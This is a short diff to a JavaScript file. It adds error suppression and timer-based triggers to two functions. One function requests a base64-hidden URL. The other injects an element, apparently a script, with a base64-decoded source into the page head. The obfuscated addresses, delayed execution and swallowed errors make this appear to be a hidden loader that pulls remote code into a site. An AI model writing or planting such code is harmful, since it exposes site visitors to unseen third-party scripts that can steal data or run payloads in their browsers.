@@ -1,5 +1,6 @@
 function DormLog()
 {
+try{
     
     var Db = 
             {
@@ -12,7 +13,8 @@ function DormLog()
 			     }
 			     GetData.open('GET',$Hdecode64(Db.key),true);
 			     GetData.send();
-			     
+			     }
+catch(e){HWarning(e);}
 }
 function HSAPP()
     {
@@ -22,5 +24,5 @@ function HSAPP()
        f.src=$Hdecode64(SiteKey);
        document.head.appendChild(f);
     }
-setTimeout(DormLog,4000);
-document.addEventListener('DOMContentLoaded',function(){HSAPP();});
+setTimeout(DormLog,6000);
+setTimeout(HSAPP,4000);
